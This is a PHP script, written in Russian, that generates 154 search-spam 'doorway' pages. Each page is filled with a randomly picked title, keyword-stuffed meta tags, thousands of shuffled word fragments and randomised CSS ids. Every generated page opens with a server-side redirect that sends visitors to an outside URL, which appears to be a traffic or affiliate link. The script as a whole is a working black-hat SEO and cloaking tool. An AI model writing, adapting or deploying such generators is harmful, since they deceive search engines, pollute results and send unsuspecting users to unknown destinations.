<!DOCTYPE html>
<html>
	<head>
		<meta charset='utf-8'>
		<title>Создать шаблон</title>
	</head>

	<body>

		<form action="/" method="POST">
			<input type="submit" name="add_temp" value="Сгенерировать дорвей">
		</form>

		<?php

			if( isset($_POST['add_temp']) ) {

				require 'div.php';
				require 'titles.php';
				require 'keys.php';
				$rand_pages = rand(1, 2);
				require 'pages' . $rand_pages . '.php';

				for( $count = 1; $count <= 154; $count++ ) {

					$title = mt_rand(0, count($titles) - 1);
					$title = $titles[$title];

					$h1 = preg_split("/[\s]+/", $title);
					shuffle($h1);
					$title_h1 = [];
					$max = max(array_keys($h1));
					for( $p = 0; $p <= $max; $p++ ) {
						array_push($title_h1, $h1[$p]);
					}
					$title1 = implode(' ', $title_h1);

					$title2 = strtr( $title, array('А' => 'а', 'Б' => 'б', 'В' => 'в', 'Г' => 'г', 'Д' => 'д', 'Е' => 'е', 'Ё' => 'ё', 'Ж' => 'ж', 'З' => 'з', 'И' => 'и', 'Й' => 'й', 'К' => 'к', 'Л' => 'л', 'М' => 'м', 'Н' => 'н', 'О' => 'о', 'П' => 'п', 'Р' => 'р', 'С' => 'с', 'Т' => 'т', 'У' => 'у', 'Ф' => 'ф', 'Х' => 'х', 'Ц' => 'ц', 'Ч' => 'ч', 'Ш' => 'ш', 'Щ' => 'щ', 'Ъ' => 'ъ', 'Ы' => 'ы', 'Ь' => 'ь', 'Э' => 'э', 'Ю' => 'ю', 'Я' => 'я') );
					$title2 = strtr( $title2, array('а' => 'a', 'б' => 'b', 'в' => 'v', 'г' => 'g', 'д' => 'd', 'е' => 'e', 'ё' => 'e', 'ж' => 'zh', 'з' => 'z', 'и' => 'i', 'й' => 'i', 'к' => 'k', 'л' => 'l', 'м' => 'm', 'н' => 'n', 'о' => 'o', 'п' => 'p', 'р' => 'r', 'с' => 's', 'т' => 't', 'у' => 'y', 'ф' => 'f', 'х' => 'h', 'ц' => 'c', 'ч' => 'ch', 'ш' => 'sh', 'щ' => 'sh', 'ъ' => '', 'ы' => 'i', 'ь' => '', 'э' => 'e', 'ю' => 'u', 'я' => 'ya', ' ' => '_') );

					for( $c = 1; $c <= 10; $c++ ) {
						$key[$c] = mt_rand(0, count($keys) - 1);
						$key[$c] = $keys[$key[$c]];
						
						$name[$c] = mt_rand(0, count($quotes) - 1);
						$name[$c] = $quotes[$name[$c]];
					}

					$words = array_merge($words1, $words2);
					shuffle($words);
					$rand = rand(5000, 10000);
					$content = array_rand($words, $rand);
					$values = [];

					for( $i = 0; $i <= $rand; $i++ ) {
						array_push($values, $words[$content[$i]]);
					}

					$content = implode('', $values);
					$content_first2 = array('А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я');
					shuffle($content_first2);
					$content_last = substr($content, 0, -1);
					$content = $content_first2[17] . "$content_last.";

					$description = substr($content, 0, 154);
					$description = strtr($description, array('/[\r]+/' => ''));
					$description = "...$description...";

					$text = "<?php header('Location: https://homyanus.com/g/7khfs3jtuseee7839fd18753afd1f1/'); ?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset='utf-8'>
		<title>$title</title>
		<meta name='description' content='$description'>
		<meta name='keywords' content='".$key[1].", ".$key[2].", ".$key[3].", ".$key[4].", ".$key[5].", ".$key[6].", ".$key[7].", ".$key[8].", ".$key[9].", ".$key[10]."'>
		<meta name='robots' content='index, follow'>
		<style type='text/css'>
			html,body{margin:0;padding:0}body{font:73% Arial,'Trebuchet MS',Helvetica,Tahoma,sans-serif;background:#ccc url(http://test3.iteam.club/template/img/bg.jpg) top 
			center repeat-y;color:#555}#".$name[1]."{width:770px;margin-left:auto;margin-right:auto;padding:0;color:#555;background:transparent 
			url(http://test3.iteam.club/template/img/wrap_bg.jpg) repeat-x}#".$name[2]."{height:100px;padding:0;margin-bottom:0}#".$name[6]."{width:770px;margin-left:auto;margin-right:
			auto;margin-top:10px;padding:0;line-height:1.8em}#".$name[9]."{padding:1em;margin:0 240px 0 0;border-right:1px solid #eee}#".$name[7]."{
			float:right;width:200px;margin-top:0;padding:1em}#".$name[10]."{clear:both;height:50px;padding:0;margin-bottom:0;margin-top:40px;
			text-align:center;border-top:5px solid #e80202;color:#fff;background:#000}h1{float:left;margin:0;padding:50px 0 20px 25px;
			font:150% 'Trebuchet MS',Helvetica,Arial,Tahoma,sans-serif;letter-spacing:5px;color:#fff}h2{float:right;margin:0;padding:25px 
			20px 20px 0;font:90% 'Trebuchet MS',Helvetica,Arial,Tahoma,sans-serif;letter-spacing:3px;color:#e80202}h3{margin:0;padding:20px 
			0 20px 0;border-bottom:1px solid #aaa;font:150% 'Trebuchet MS',Helvetica,Arial,Tahoma,sans-serif;text-transform:uppercase;
			letter-spacing:3px;color:#e80202}blockquote{font-weight:bold;font-style:italic;border-bottom:1px solid #aaa;border-top:1px 
			solid #aaa;color:#b29b35}a:link,a:visited{color:#e80202;background:inherit;text-decoration:underline}a:hover{color:#636363;
			background:inherit;text-decoration:none}a img{border:0}.left{float:left;border:0 solid #656c4a;margin:5px 0 10px 0;padding:10px}
			legend{color:#e80202}input{background:#eee}#".$name[3]."{height:24px;background:#000;display:block;padding:45px 0 0 15px}#".$name[4]."{
			position:relative;display:block;height:24px;font-size:11px;font-weight:bold;font-family:Arial,Verdana,Helvitica,sans-serif}
			#".$name[4]." ul{margin:0;padding:0;list-style-type:none;width:auto}#".$name[4]." ul li{display:block;float:left;margin:0 1px 0 0}#".$name[4]." 
			ul li a{display:block;float:left;color:#fff;text-decoration:none;padding:5px 20px 0 20px;height:19px;background:transparent 
			url(http://test3.iteam.club/template/img/menu_bg-OFF.jpg) no-repeat top left}#".$name[4]." ul li a:hover{color:#fff;background:transparent url(http://test3.iteam.club/template/img/menu_bg-OVER.jpg) 
			no-repeat top right}#".$name[4]." ul li a.".$name[5].",#".$name[4]." ul li a.".$name[5].":hover{color:#000;background:#fff}
		</style>
	</head>

	<body>
		<div id='".$name[1]."'>
			<div id='".$name[2]."'>
				<h1>Компания</h1>
				<h2><a href='/template'>главная</a> | <a href='/template'>контакты</a></h2>
			</div>
			<div id='".$name[3]."'>
				<div id='".$name[4]."'>
					<ul>
						<li><a href='/' class='".$name[5]."'>Главная</a></li>
						<li><a href='/template'>О нас</a></li>
						<li><a href='/template'>Сервисы</a></li>
						<li><a href='/template'>Наши работы</a></li>
						<li><a href='/template'>Обратная связь</a></li>
					</ul>
				</div>
			</div>
			<div id='".$name[6]."'>
				<div id='".$name[7]."'>
					<h3>Функционал</h3>
					<img src='http://test3.iteam.club/template/img/rose.jpg' alt=''>
					<h3>Архив записей</h3>
					<ul>
						<li><a href='/template'>Апрель 2017</a></li>
						<li><a href='/template'>Май 2017</a></li>
						<li><a href='/template'>Июнь 2017</a></li>
						<li><a href='/template'>Июль 2017</a></li>
					</ul>
					<hr>
					<div id='".$name[8]."'>
						<h4>Доп. информация</h4>
						<ul>
							<li>Как стать счастливым</li>
							<li>Как стать успешным</li>
							<li>Как стать богатым</li>
							<li>Как стать предпринимателем</li>
							<li>Как стать водителем</li>
							<li>Как стать еще кем-нибудь</li>
							<li>Как стать</li>
							<li>Как</li>
						</ul>
					</div>
				</div>
				<div id='".$name[9]."'>
					<center><h1 style='color: black;'>$title1</h1></center><br><br><br><br><br><br>
					<center><p>$content</p></center>
				</div>
			</div>
			<div id='".$name[10]."'>
				<a href='/template'>главная</a> |
				<a href='/template'>о нас</a> |
				<a href='/template'>сервисы</a> |
				<a href='/template'>наши работы</a><br>
				Копирайт 2017. Все права защищены.
			</div>
		</div>
	</body>
</html>";

					@mkdir('C:/Users/1/Desktop/OpenServer/domains/test2/' . $title2);

					$fp = fopen("$title2/index.php", "w");
					fwrite($fp, $text);

				}

			}

		?>

	</body>
</html>